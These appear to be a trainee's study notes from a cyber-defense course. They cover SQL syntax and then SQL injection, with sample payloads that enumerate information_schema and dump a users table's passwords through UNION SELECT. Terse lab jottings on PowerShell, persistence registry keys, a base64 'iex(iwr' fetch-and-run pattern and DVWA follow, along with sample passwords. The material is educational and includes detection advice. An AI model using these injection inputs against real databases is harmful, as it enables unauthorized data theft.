CREATE USER 'trainee'@'localhost' IDENTIFIED BY 'CyberTraining1!';

Manipulation Commands
The SELECT command fetches data from a table, and the table returns the data in the form of a result table. Result tables are known as result sets. The syntax for the SELECT command is as follows:

SELECT column1, column2, column3 FROM table_name;
﻿

It is also possible to return all the fields available in the table using the following command:

SELECT * FROM table_name;  
﻿

The INSERT command adds new rows of data to a table within the database. The INSERT command can be used in two ways. An example of the syntax used for the first way is as follows:


INSERT INTO Customer_Data (Order Number, Name, Amount Due)
VALUES (5, Cameron, $35);
﻿

In the above example, Customer_Data is the table, and Order Number, Name, and Amount Due are the names of the columns in the table into which data is inserted. The corresponding values are the data that is inserted into each of the columns. 

﻿

If a case exists in which values are being added to every column in a table, the columns do not have to be specified. However, the order of the values must be the same order as the columns in the table. An example of the syntax for this second way of using the INSERT command is as follows:


INSERT INTO Customer_Data VALUES (5, Cameron, $35);
 

The UPDATE query can modify existing records in a table. To update a specific row and field, WHERE and SET must be used to specify the row and condition to be updated. The syntax for the UPDATE query is as follows:


UPDATE table_name
SET column1 = value1, column2 = value2
WHERE [condition];
﻿

An example of the UPDATE query is as follows:


UPDATE Customer_Data
SET Amount Due = $0
WHERE [Order Number] = 5;
﻿

The above example updates the Amount Due column to $0 for the Order Number 5.

﻿

The DELETE query deletes the existing records from a table. The WHERE clause can be used with the DELETE query to delete a specific row. If no row is specified, all records in the table are deleted. The syntax for this query is as follows: 


DELETE FROM table_name
WHERE [condition];


 Control Commands
The GRANT command grants permissions on database objects to specific users or roles. Table owners often give other users access to data with the GRANT command. The general syntax for this command is as follows:


GRANT <some permission> ON <some object> TO <some user, login, or group>
﻿

As an example, the below command gives all permissions to the databases within the SQL server to the user trainee: 


GRANT ALL ON *.* TO trainee@localhost;  
﻿

The REVOKE command revokes the privileges or roles of an account. The syntax is as follows: 


REVOKE
privilege1, privilege2, privilege3
ON [object_type] priv_level
TO user_or_role1, user_or_role2, user_or_role3
﻿

The following command revokes all privileges for a user:

REVOKE ALL [PRIVILEGES], GRANT OPTION
   FROM user_or_role [, user_or_role] 

 Control Commands
The GRANT command grants permissions on database objects to specific users or roles. Table owners often give other users access to data with the GRANT command. The general syntax for this command is as follows:


GRANT <some permission> ON <some object> TO <some user, login, or group>
﻿

As an example, the below command gives all permissions to the databases within the SQL server to the user trainee: 


GRANT ALL ON *.* TO trainee@localhost;  
﻿

The REVOKE command revokes the privileges or roles of an account. The syntax is as follows: 


REVOKE
privilege1, privilege2, privilege3
ON [object_type] priv_level
TO user_or_role1, user_or_role2, user_or_role3
﻿

The following command revokes all privileges for a user:

REVOKE ALL [PRIVILEGES], GRANT OPTION
   FROM user_or_role [, user_or_role] 


   Clauses
The DISTINCT clause is used in conjunction with the SELECT command to eliminate any duplicate records and to fetch only the unique records. If a situation exists in which there are multiple duplicate records in a table, the DISTINCT clause can be used to fetch only the unique records and not the duplicates. The syntax for this clause is as follows:


SELECT DISTINCT column1, column2
FROM table_name
WHERE [condition]
﻿

The WHERE clause can specify a condition while fetching the data from a table or tables. If the given condition is satisfied, the clause returns a specific value from the table. The WHERE clause filters through the records in a table and fetches only the records that are necessary. The clause is used with multiple SQL commands, such as SELECT, UPDATE, and DELETE. The syntax for the WHERE clause is as follows:

WHERE [condition]
﻿

An example of using the WHERE clause is as follows:


UPDATE Customer_Data
SET Amount Due = $0
WHERE [Order Number] = 5; 
﻿

The LIKE clause can compare a value to similar values using wildcards. This clause is used with the SELECT command and the WHERE clause. Two wildcards are used with the LIKE clause:  the percent (%) symbol  and the underscore (_) symbol. The % symbol represents zero, one, or multiple characters, and the _ symbol represents a single number or character. The following examples illustrate the syntax for the LIKE clause.

﻿

The command below finds any values that start with the given value (in this case, '200'):

SELECT * FROM table_name
WHERE column LIKE '200%';
﻿

The command below finds any values that end with a given value (in this case, '3'): 

SELECT * FROM table_name
WHERE column LIKE '%3';
﻿

The command below finds any values that begin with 40 and have three characters in length: 


SELECT * FROM table_name
WHERE column LIKE '40_';
﻿

The command below finds any values that start with a 2 and end with a 3:

SELECT * FROM table_name
WHERE column LIKE '2_3';
﻿

The ORDER BY clause can sort the data in ascending or descending order, based on one or more columns. Some databases sort the query results in ascending order by default. The syntax for this clause is as follows:


SELECT column-list
FROM table_name
[WHERE condition]
[ORDER BY column1, column2, column3] [ASC | DESC];
﻿

An example of using this clause to sort the records of the previously mentioned customer_data table in ascending order by name is as follows:


SELECT * FROM CUSTOMER_DATA
ORDER BY NAME
 

The GROUP BY clause is used in conjunction with the SELECT command to arrange identical data into groups. The GROUP BY clause can be used with the ORDER BY clause to sort the data in a specific order. The GROUP BY clause must come before the ORDER BY clause if the ORDER BY clause is included in the full command. However, if a WHERE clause exists in the command, the GROUP BY clause comes after the WHERE but before the ORDER BY clause. The full syntax of the GROUP BY clause used with the ORDER BY clause is as follows:


SELECT column1, column2
FROM table_name
WHERE [ conditions ]
GROUP BY column1, column2
ORDER BY column1, column2
﻿

The COUNT clause returns the number of records returned by a SELECT command. The syntax for this clause is as follows:


SELECT COUNT([DISTINCT] <column_name>)
FROM <table_name>


 Operators
An SQL operator is a word or character that performs an operation. An SQL operator is similar to an expression in other languages. Operators specify conditions in an SQL command and serve as conjunctions for multiple conditions in a command. Operators are often used in conjunction with the WHERE clause. The main types of operators are arithmetic, logical, and comparison operators. 

﻿

Arithmetic operators perform various mathematical operations on the data stored in a table. The syntax used for these operators is as follows:


Select <expression1> operator <expression2> 
﻿

Example syntax for an arithmetic operator is as follows:


SELECT 10 + 2
![image](https://github.com/user-attachments/assets/ef181dab-b342-48ce-85f3-de07652ac23e)

Comparison operators compare one value to another value or one expression to another expression. The syntax for these operators is as follows:
SELECT column FROM table_name WHERE condition1 Relational Operator condition2;



Example syntax for a comparison operator is as follows:

SELECT FName, salary FROM finance where salary =5000;



Table 15.3-3 describes SQL comparison operators:
![image](https://github.com/user-attachments/assets/95f7faed-2628-4aac-ad08-3e92efd312a7)




Logical operators perform true or false operations. They provide a true or false value based on the provided values and the operator that is used. The syntax for the logical operator is as follows:

SELECT col name  * | expr [logical operator] [col name | * | expr..] FROM tablename
WHERE <expr> [ logical operator |
arithmetic operator | ...] <expressions>;



An example of a logical operator is as follows:

SELECT fid,FName,address,salary
FROM finance
WHERE FName = 'Leslia' AND  salary = 2500;


![image](https://github.com/user-attachments/assets/75e06e2e-ddce-4294-a577-332b6e1dcbf0)

The UNION operator combines the result set of two or more SELECT statements. Every SELECT statement within UNION must have the same number of columns, and they must also have similar data types. The columns in every SELECT statement must also be in the same order. The syntax for the UNION operator is as follows:

SELECT column_name(s) FROM table1
UNION
SELECT column_name(s) FROM table2;



![image](https://github.com/user-attachments/assets/2720088a-cf34-4099-9cde-cd7bf21b017d)

Using the commands from the previous lab, search for flag0 in the sakila database. In which district is the "flag0" address?





![image](https://github.com/user-attachments/assets/dec3a886-2ab0-4fa5-88d6-857860b7c956)



![image](https://github.com/user-attachments/assets/9ccf57cc-6137-4fe9-9159-c3e7617ea0a3)


![image](https://github.com/user-attachments/assets/7ff9092a-c6e0-45d1-8d6b-6e2db732422e)


![image](https://github.com/user-attachments/assets/28523caa-a738-442f-a093-654dc8f7fe98)



![image](https://github.com/user-attachments/assets/a958056d-d409-4944-99c9-7e58db7bafd5)


![image](https://github.com/user-attachments/assets/c2aa42b9-d119-403c-b3ee-7314403c1335)



﻿
SQL Injection Overview
Most modern web applications use some sort of database for permanent storage. SQL is one of the most popular database choices of developers. Using SQL, the applications create queries to read and write information in the database. 

﻿

In addition, most web applications implement user input as part of the SQL queries. SQL is often constructed as a string in the underlying language and passed to the database. If developers are not careful with user input, users might be able to modify the query structure and change the intended behavior of the queries using the SQL query syntax. This can result in a SQL Injection (SQLi). 

﻿

An SQLi is a vulnerability that allows an attacker to use custom user input to manipulate SQL statements passed to the SQL database. This manipulation might compromise the server and allow unauthorized access to files or enable other attacks.

﻿![image](https://github.com/user-attachments/assets/37850908-9318-4707-9ec3-2e61d1d766d9)


 
The query to return data from this table that matches the admin string is as follows:
SELECT * FROM users WHERE uname = 'admin';



The above query returns the following:
1,admin,Admin2022!!,y,admin 



If a web application were created to show a full name (fname) for a user-provided user, the web application would use the following command:

input = read_data_from_user()
SELECT fname FROM users WHERE uname = '$input';



The user would input data into a web form that would be passed to the input variable. The SELECT statement would run and return the appropriate fname that matched the input uname. For example, if the user input will, it would return will o'brien.


An attacker could manipulate the input by adding a single quotation mark ('), which would close the string in the SELECT statement and cause an error. The syntax for the attacker's statement is as follows:
SELECT fname FROM users WHERE uname = ''';



If the SQL server were not properly configured, it might or might not respond with an error to the attacker. If an attacker were able to see an error response, the attacker might then attempt to dump all the data within the SQL database. This could be done using one of the methods in Table 15.3-7 to complete an SQLi:


![image](https://github.com/user-attachments/assets/2389a9dd-4a89-4372-aac2-11000c32186e)


An attacker could also attempt to gather other information by combining queries with the SQL UNION operator. Because the UNION operator could be used only with queries of the same column count, attackers could use the SELECT statement to figure out how many columns are in the table.  


Attackers can sequentially request the SELECT statement to be ordered by a different column using the user input of *' order by 2 ;--. This sorts the returned data by the second column. If the query returns an error, there is only one column. If data is returned, there are at least two columns. An attacker then repeats this statement and increases the column count each time until an error returns. 


The following scenario is an example of how an attacker could dump the contents of the passwords saved in the user’s table. 


First, an attacker issues a command to return all the table names in the database, as follows:
' UNION SELECT * FROM information_schema.tables; – 



This returns the table named users. Next, the attacker returns all the column names, as follows:
' UNION SELECT * FROM information_schema.columns WHERE table_name='users';--



This returns uid, uname, pass, admin, fname in the example. Now that the attacker has an idea of the table structure, it is possible for the attacker to dump the passwords saved in the table one column at a time using the following command:
' UNION SELECT pass FROM users ; –



If, during a hunt, an analyst discovers any traffic associated with an SQL server containing the keyword SELECT followed by information_schema, information_schema.columns, or UNION SELECT, then the traffic is worth investigating. 


![image](https://github.com/user-attachments/assets/4ecdfa27-9e79-4a16-8f0d-c22e22805d7d)


![image](https://github.com/user-attachments/assets/af905a2c-2a7f-4cd2-b511-39fcd5d93b19)

1 search with file explorer 11,1

search for string in file explorer

![image](https://github.com/user-attachments/assets/0f6da1a3-3756-4a19-8fa4-3741f2f4139e)

![image](https://github.com/user-attachments/assets/f92b6280-2e6e-4654-a949-4b1670459f12)

![image](https://github.com/user-attachments/assets/2689cd9e-a2f8-4fb5-9b1e-3bd464536451)


![image](https://github.com/user-attachments/assets/1e96af0f-34d1-4154-ae66-c4ad06a461d3)



2 looking with active directory get-aduser idenity etc 11.2
get-aduser -identity bob.bonsion -properties *

![image](https://github.com/user-attachments/assets/18dffefe-0223-42bd-9ea4-47c4d56d3dfa)

![image](https://github.com/user-attachments/assets/7b1487db-cb73-4712-aee5-d67102f7955c)

![image](https://github.com/user-attachments/assets/db60a4cb-0daa-4445-8887-b4429ddecfc6)

![image](https://github.com/user-attachments/assets/9a41d8df-ab1f-4633-9d2f-a1257f6a841a)

![image](https://github.com/user-attachments/assets/3aa1ef95-f50e-449e-9e35-2d8317725d38)

![image](https://github.com/user-attachments/assets/341c9a78-6a47-4666-aa25-ac68e866d484)

![image](https://github.com/user-attachments/assets/447e31fb-d25d-42bc-9692-954ac5dbac4c)








3 4 open script and run command let instead of trying to import 11.3 11.5
get-aduser -identity polly.vasquez
get-aduser -identity polly.vasquez -properties passwordneverexpires

![image](https://github.com/user-attachments/assets/a965cf81-2d36-4a52-bd16-809ab117542f)

![image](https://github.com/user-attachments/assets/40d9e737-8733-4a7d-b59e-50e74b4ebe63)

![image](https://github.com/user-attachments/assets/a268014c-0c96-4173-ad75-2f2e5c6d4821)

4 Get-Hotfix

![image](https://github.com/user-attachments/assets/f8b8670d-9450-431a-8105-f759d0d1e322)

![image](https://github.com/user-attachments/assets/6fccf3ce-016b-4942-98cb-8a1d36c1bb07)

![image](https://github.com/user-attachments/assets/a0394863-3778-47de-824f-7a62594771af)

![image](https://github.com/user-attachments/assets/e25e9459-3525-49fb-9e3f-d9ab5e2f59e6)




5 invoke-attomictest look at results m12,1

6 important registry keys core 4

look in script for persistence
new-itemproperty -path hkcu\software\microsoft\...+

7 use kibana 12.1

8 run copmmand and tell about it 12.2
papitas

9 base64 decode 12.3 (base64decode.org)
frombase64
strip null values
iex(iwr

10 use curl commands 12.3
systeminfo

11 use wmi go accross the wire with one off commands to get back results win32_ process win32_service win32_bios win32_...... 12.4

Get-wmiobject win32_service -cn dc01 -filter "Name='DNS'"

12 interacting with the interacting python will tell use exactly what to run and get info from results 13.1

![image](https://github.com/user-attachments/assets/3df565f1-30df-4fac-a28e-3e240b40631d)


![image](https://github.com/user-attachments/assets/a4ffa33f-0ef0-4fc1-a69e-1a79f897d470)


13 open python folder and make changes to the script base on what the question is asking 13.2
How many IP addresses have a byte count over 1024?
make changes to script change > 2000 to > 1024


14 in nuggets folders python help script make modification baseed on what is being asked will run agaisnt checker script but if all else go in script to get the file to find the awnsers13.3
What characters return after executing python3 check_script.py?

take checker script and (with open ('this, 'rb')' run it in bas64 decoder, on desktop
find line that they are looking for.

15 jupiter with small regex and remeber should go in the qoutes r'changeme'13.4

launch as normal user not admin
re.findall(r'^'North'

16 string parsing analyize host logs or os data do small script modifications and do this tell about it 13.5



17 make new script is built out just need to plug in variables 14.1



18 apts and ttp ioc checker ioc 14.2 14.3


19 build tool to get remote artifacts look for changes me run and tell the results directorys or the registry lopok for commands in files 14.2
Access the scripts folder on the desktop. Modify the script scriptA.py so that information from the system is read into output.txt. Run the script, and examine the output.
How many IPs does the script find?
input systeminfo or ipconfig into changeme

20 look at if and else statments for bash open file and add some in formation or create new line to make the scriptr fucntion properly make it a specififc string answer is not the result but what you put into the script 15.1
Access the bash script file example.sh, located on the desktop. Add a line to the script so that it returns "String is not empty" when the variable is set to hello, according to the line below, where the bold value is replaced by the variable value. 

string=[VALUE]
string="hello"

Question:

What line was added to the script?


21 crontabs setting up 15.1

something.py to execute every Wednesday and Sunday at 5:25 a.m
25 5 * * 0,3 ~/something.py

22 perl experssions look for / and =~ to find what you wann search for15.2

string error
/changeme/
/error/
cat log_file.txt | grep "error" | wc
or go into log_file and search

23 sql and logging into sql server tells data base and table to use and dont foprget ; on the end 15.3
Open the command prompt, and access the MySQL database dvwa by entering the following command: 
mysql -u root
use dvwa (this selects database)
SELECT * FROM users;
user_id | first_name | last_name | user | password | avatar | last_login | failed_login


